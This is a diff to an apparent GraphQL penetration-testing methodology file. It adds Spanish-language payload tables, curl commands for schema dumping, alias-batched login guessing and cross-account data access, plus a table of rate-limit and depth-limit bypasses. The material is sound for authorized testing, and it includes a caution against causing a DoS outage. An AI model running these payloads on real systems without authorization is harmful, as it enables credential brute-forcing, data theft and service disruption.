@@ -122,6 +122,60 @@ chains_with: [idor, broken-access-control, rate-limiting]
 - **graphql-cop** — automated checks for common GraphQL misconfigurations (introspection
   exposure, batching, missing depth/complexity limiting, field suggestion leakage).
 
+## Payloads & Detection Patterns
+
+Guía de caza: una familia por feature estructural del lenguaje GraphQL. La sola observación
+estructural (introspection on) es Inferred/informativa; Demonstrated exige acceso real a datos o una
+desviación de comportamiento (bypass de auth, contador de rate-limit incrementando menos que las ops).
+
+| Categoría | Shape | Propósito |
+|---|---|---|
+| Introspection | `query { __schema { types { name fields { name } } } }` | Volcar el modelo de datos completo |
+| Field suggestion leak | campo inexistente → error `did you mean ...` | Reconstruir schema con introspection off |
+| Batch/alias abuse | `{ a: login(...){token} b: login(...){token} }` | Bypass de rate-limit que cuenta requests HTTP, no ops |
+| Nested/circular DoS | `{ a { b { c { ...recursivo } } } }` (incremental) | Agotar recursos sin límite de profundidad/costo |
+| Field-level auth bypass | `{ user(id:"B"){ email paymentMethods{ last4 } } }` como cuenta A | Resolver sin check object-level |
+| Mutation auth bypass | `mutation { updateUser(id:"B", input:{...}){id} }` | Write-path sin el check que sí tiene el read-path |
+| Type/interface coercion | enviar tipo concreto inesperado en campo union/interface | Eludir validación escrita contra otro tipo hermano |
+
+Surface signals que delatan la clase antes de inyectar:
+- Endpoint `/graphql`, `/graphiql`, `/api/graphql`, `/v1/graphql` o POST-JSON que acepta `{"query":"..."}`.
+- GraphiQL/Playground/Apollo Sandbox alcanzable sin auth; introspection `__schema` que responde en vez de error.
+- Mutations/queries que espejan endpoints REST ya mapeados → candidato a auth re-implementada (o no) por resolver.
+- Campos de relación que cruzan ownership (un `user` con `payments`) resolubles desde cualquier sesión.
+
+```bash
+# introspection + confirmación de batching/alias (contar ops lógicas vs contador de rate-limit)
+curl -s -X POST https://target/graphql -H "Content-Type: application/json" \
+  -d '{"query":"{ __schema { queryType { name } types { name } } }"}'
+curl -s -X POST https://target/graphql -H "Content-Type: application/json" \
+  -d '{"query":"{ a: login(user:\"t\",pass:\"g1\"){token} b: login(user:\"t\",pass:\"g2\"){token} }"}'
+```
+
+```bash
+# field-level auth bypass: cuenta A pidiendo recurso de cuenta B (control: mismo query con token B)
+curl -s -X POST https://target/graphql -H "Authorization: Bearer $TOKEN_A" \
+  -H "Content-Type: application/json" \
+  -d '{"query":"{ user(id:\"<B_id>\"){ email paymentMethods{ last4 } } }"}'   # payload: datos de B
+```
+
+## Bypass Techniques
+
+Agrupadas por el control que evaden; probar la familia completa antes de cerrar. El DoS por anidamiento
+es destructivo: escalar la profundidad solo mientras el tiempo escale linealmente y parar antes del outage
+sin gate del operador.
+
+| Filtro evadido | Técnica | Notas |
+|---|---|---|
+| Introspection deshabilitada | Field suggestion (`did you mean`), queries reales de `js-analysis`/tráfico | Reconstrucción parcial del schema |
+| Rate-limit por request HTTP | Batching/aliasing de N ops en un request | Confirmar contador incrementando <N |
+| Rate-limit por operación | Array de queries en un solo POST (si el server lo soporta) | Variante de batching a nivel transporte |
+| Auth a nivel endpoint | Resolver que no re-chequea object-level (field-level bypass) | El core de esta skill vs REST que sí bloquea |
+| Check en read-path | Repetir el bypass en mutations (write-path) | El write suele omitir el check del read |
+| Validación por tipo esperado | Type/interface coercion a tipo hermano sin check | Auth escrita contra un implementing type, no el otro |
+| Depth/complexity limiting | Aliasing ancho (muchos campos) en vez de profundo, fragmentos | Buscar el umbral real, no asumir por un rechazo |
+| Persisted-queries only | N/A real si no acepta query cruda; confirmar antes de armar plan | Defeat de pasos 3–6 por diseño |
+
 ## Root Causes
 
 - Authorization implemented at the HTTP/endpoint layer for REST but not re-implemented per
